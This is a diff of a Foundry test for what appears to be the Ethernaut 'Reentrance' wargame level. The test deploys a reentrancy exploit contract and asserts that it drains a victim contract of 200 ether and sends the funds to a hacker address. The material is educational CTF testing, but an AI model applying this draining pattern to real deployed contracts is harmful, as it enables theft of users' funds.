@@ -12,28 +12,48 @@ contract ReentrancyTest is Test {
 
     Reentrance public level;
     ReentrancyExploit public exploit;
-
-    address instance = vm.addr(0x10053); 
+    address payable instance = payable(vm.addr(0x10053)); 
     address hacker = vm.addr(0x1337); 
+    uint256 initialDeposit = 0.01 ether;
+    uint256 initialVictimBalance = 200 ether;
 
     function setUp() public {
         vm.prank(instance);  
-        vm.deal(instance, 10 ether);
-        vm.deal(hacker, 1 ether);
+        vm.deal(instance, initialVictimBalance);
+        vm.deal(hacker, initialDeposit);
+
         level = new Reentrance();
-        level.donate{value: 1 ether }(instance);
+        level.donate{value: initialVictimBalance}(instance);
     }
 
     function testReentrancyHack() public {
 
         vm.startPrank(hacker);
-        assert(instance.balance > 0);
 
-        exploit = new ReentrancyExploit();
-        (bool success) = exploit.run{value: 0.1 ether}(level);
+        exploit = new ReentrancyExploit(level);
         
-        //assert(success);
-        //assert(instance.balance == 0);
+        /////////////////////////////
+        // drain the victim contract
+        /////////////////////////////
+
+        assert(hacker.balance == initialDeposit);
+        assert(instance.balance == initialVictimBalance);
+        assert(address(level).balance == initialVictimBalance);
+        assert(address(exploit).balance == 0);
+
+        exploit.run{value: initialDeposit}();
+        assert(address(exploit).balance == initialVictimBalance + initialDeposit);
+        assert(hacker.balance == 0);
+
+        ///////////////////////////////////////////
+        // withdraw from ReentrancyExploit contract
+        ///////////////////////////////////////////        
+        
+        bool success = exploit.withdrawToHacker();
+        assert(success);
+        assert(hacker.balance == initialVictimBalance + initialDeposit);
+        assert(address(exploit).balance == 0);
+
         vm.stopPrank();
         
     }
